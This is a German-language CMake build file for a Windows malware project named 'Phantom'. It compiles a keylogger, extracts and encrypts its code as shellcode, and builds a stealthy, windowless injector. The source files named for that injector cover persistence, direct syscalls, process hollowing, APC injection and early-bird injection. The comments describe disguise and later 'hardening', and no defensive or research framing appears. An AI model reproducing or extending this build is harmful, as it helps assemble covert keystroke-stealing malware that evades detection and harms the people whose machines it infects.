# CMake Bauplan für Operation "Phantom"
# Version 2.0 - Polymorpher Build

# Mindestversion für CMake festlegen
cmake_minimum_required(VERSION 3.15)

# Projektname definieren
project(Phantom LANGUAGES CXX ASM_NASM)

# C++ Standard auf C++17 setzen
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# --- Compiler- und Linker-Einstellungen zur Tarnung ---

# Wir bauen eine "stille" Anwendung ohne Konsolenfenster
set(CMAKE_WIN32_EXECUTABLE_LAUNCHER "WinMain")

if(MSVC)
    # Spezifische Einstellungen für den Microsoft Visual C++ Compiler
    
    # Optimierungen für minimale Größe
    set(CMAKE_CXX_FLAGS_RELEASE "/O1 /GL /Gy")
    set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} /LTCG /OPT:REF /OPT:ICF")
    
    # Erzeuge keine Debug-Informationen in der Release-Version
    set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /DNDEBUG")
    
    # Baue ohne C-Runtime-Bibliothek, um die Größe drastisch zu reduzieren
    # Dies erfordert fortgeschrittene Techniken (eigener Entry Point etc.)
    # Vorerst deaktiviert, kann in einer späteren Härtungsphase aktiviert werden.
    # set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} /NODEFAULTLIB")

else()
    # Spezifische Einstellungen für GCC/MinGW
    
    # Optimierungen für minimale Größe
    set(CMAKE_CXX_FLAGS_RELEASE "-Os -s")
    
    # Entferne alle nicht benötigten Informationen
    set(CMAKE_EXE_LINKER_FLAGS_RELEASE "-Wl,--gc-sections")
    
    # Erstelle ein reines Windows-Programm, keine Konsole
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -mwindows")
endif()

# NEU: Binde die WMI-Bibliothek ein
list(APPEND CMAKE_EXE_LINKER_FLAGS "-lwbemuuid")

# --- PHASE 1: Keylogger als Shellcode kompilieren ---

# 1. Erstelle eine temporäre Executable für den Logger
add_executable(Logger_temp src/logger.cpp)
target_link_libraries(Logger_temp PRIVATE ws2_32 dnsapi)

# 2. Extrahiere den .text-Abschnitt (Shellcode) aus der temporären Executable
# Wir verwenden objcopy (Teil von MinGW/GCC) oder ein ähnliches Werkzeug.
set(SHELLCODE_BIN ${CMAKE_BINARY_DIR}/payload.bin)
set(PAYLOAD_HEADER ${CMAKE_BINARY_DIR}/payload.h)

# Finde das objcopy-Werkzeug
find_program(OBJCOPY_PATH objcopy)
if(NOT OBJCOPY_PATH)
    message(FATAL_ERROR "objcopy not found. Please ensure it's in your PATH.")
endif()

add_custom_command(
    OUTPUT ${SHELLCODE_BIN}
    COMMAND ${OBJCOPY_PATH} -O binary --only-section=.text $<TARGET_FILE:Logger_temp> ${SHELLCODE_BIN}
    DEPENDS Logger_temp
    COMMENT "Extracting shellcode from logger executable..."
)

# 3. Rufe das Python-Skript auf, um den Shellcode zu verschlüsseln und den Header zu erstellen
find_package(Python3 REQUIRED COMPONENTS Interpreter)

add_custom_command(
    OUTPUT ${PAYLOAD_HEADER}
    COMMAND ${Python3_EXECUTABLE} ${CMAKE_SOURCE_DIR}/bin_to_header.py ${SHELLCODE_BIN} ${PAYLOAD_HEADER}
    DEPENDS ${SHELLCODE_BIN}
    COMMENT "Encrypting shellcode and generating C++ header..."
)

# Erstelle ein benutzerdefiniertes Ziel, um diese Befehle auszuführen
add_custom_target(CreatePayload ALL DEPENDS ${PAYLOAD_HEADER})


# --- PHASE 2: Finalen Injektor kompilieren ---

# KORREKTUR: Definiere die Quell-Dateien in einer Liste
set(INJECTOR_SOURCES
    src/injector.cpp
    src/persistence.cpp
    src/syscalls.cpp
    src/techniques/util.cpp
    src/techniques/ProcessHollowing.cpp
    src/techniques/ApcInjection.cpp
    src/techniques/EarlyBirdInjection.cpp
    src/techniques/syscall_stub.asm
)

# KORREKTUR: Erstelle die ausführbare Datei aus der Liste der Quellen
add_executable(Phantom ${INJECTOR_SOURCES})

# Der Injektor muss auf die Erstellung des Headers warten
add_dependencies(Phantom CreatePayload)

# Füge das Build-Verzeichnis zum Include-Pfad hinzu, damit payload.h gefunden wird
target_include_directories(Phantom PRIVATE ${CMAKE_BINARY_DIR} ${CMAKE_SOURCE_DIR}/src/techniques)

# Notwendige Bibliotheken linken (ws2_32 wird für den Logger-Teil nicht mehr hier benötigt)
target_link_libraries(Phantom PRIVATE psapi)

# Spezifische Linker-Flags für das finale Executable
target_link_libraries(Phantom PRIVATE ws2_32 dnsapi wbemuuid)


# --- Installationsschritt ---
# Definiert, wohin die finale .exe kopiert werden soll

install(TARGETS Phantom
    DESTINATION ../dist
) 